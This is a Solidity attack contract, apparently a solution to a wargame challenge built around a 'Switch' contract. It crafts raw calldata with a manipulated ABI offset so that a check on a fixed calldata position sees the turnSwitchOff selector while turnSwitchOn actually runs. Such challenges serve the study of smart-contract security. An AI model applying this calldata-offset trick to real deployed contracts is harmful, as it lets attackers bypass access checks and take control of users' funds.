// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Switch} from "./Switch.sol";

contract SwitchAttacker {
    bytes4 constant onSelector  = Switch.turnSwitchOn.selector;
    bytes4 constant offSelector = Switch.turnSwitchOff.selector;
    bytes4 constant flipSelector = Switch.flipSwitch.selector;

    Switch public switchContract;

    constructor(address _switch) {
        switchContract = Switch(_switch);
    }

    function attack() public {
        
        bytes memory customCalldata = bytes.concat(
            flipSelector,
            bytes32(uint256(96)),        // offset
            bytes32(0),                  // filler (32 bytes)
            bytes.concat(offSelector, new bytes(28)),
            bytes32(uint256(4)),         // length
            bytes.concat(onSelector)
        );

        (bool success, ) = address(switchContract).call(customCalldata);
        if(!success) {
            revert("Failed Attack");
        }
    }
}